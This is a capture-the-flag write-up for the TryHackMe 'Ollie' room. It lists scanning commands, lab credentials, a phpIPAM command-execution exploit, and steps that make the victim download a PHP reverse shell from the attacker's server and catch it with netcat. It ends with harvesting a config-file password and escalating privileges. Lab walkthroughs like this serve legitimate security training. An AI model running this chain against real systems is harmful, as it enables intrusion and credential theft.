# Ollie

**Room Link:** [https://tryhackme.com/room/ollie](https://tryhackme.com/room/ollie)

## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## TCP/80 - HTTP

**Kali**

```
gobuster dir -u $VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



## TCP/1337 - waste

**Kali**

```
nc -v $VICTIM 1337
```



<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## TCP/80 - HTTP

**Browser**

```
Username: admin
Password: OllieUnixMontgomery!
```



<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Initial Shell

**Exploit:** [https://www.exploit-db.com/raw/50963](https://www.exploit-db.com/raw/50963)



**Kali**

```
python3 exploit.py  -usr admin -pwd OllieUnixMontgomery! -cmd 'whoami' -url http://$VICTIM
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can run commands from the browser as well.

<figure><img src="../../.gitbook/assets/image (633).png" alt=""><figcaption></figcaption></figure>

Got this php reverse shell, just changed the IP

**Kali**

```
git clone https://github.com/pentestmonkey/php-reverse-shell
cd php-reverse-shell
subl php-reverse-shell.php 
python2 -m SimpleHTTPServer 81
```

**Kali**

```
nc -lvnp 1234
```

We have access to write to the immaolllieeboyyy directory so we put our shell there.

**Browser**

```
wget http://$KALI:81/php-reverse-shell.php -O immaolllieeboyyy/test.php
```

**Browser**

<pre><code><strong>http://VICTIM:/immaolllieeboyyy/test.php
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (635).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (636).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

**Victim**

```
cd /var/www/html
grep -ir "pass" config.php -A4 -B4
```

<figure><img src="../../.gitbook/assets/image (637).png" alt=""><figcaption></figcaption></figure>

We can login to mysql but didn't find anything

**Victim**

```
mysql -uphpipam_ollie -pIamDah1337estHackerDog!
```



**Victim**

```
su ollie
Password: OllieUnixMontgomery!
```

<figure><img src="../../.gitbook/assets/image (638).png" alt=""><figcaption></figcaption></figure>

## PSPY

**Kali**

```
wget http://$KALI:81/pspy32 
chmod +x pspy32 
./pspy32 
```

**Victim**

```
cd /tmp/
wget http://10.10.231.159:81/pspy32 
chmod +x pspy32 
./pspy32
find / -name "feedme" 2>/dev/null 
```

<figure><img src="../../.gitbook/assets/image (640).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

<figure><img src="../../.gitbook/assets/image (641).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (642).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 1338
```

<figure><img src="../../.gitbook/assets/image (643).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (644).png" alt=""><figcaption></figcaption></figure>
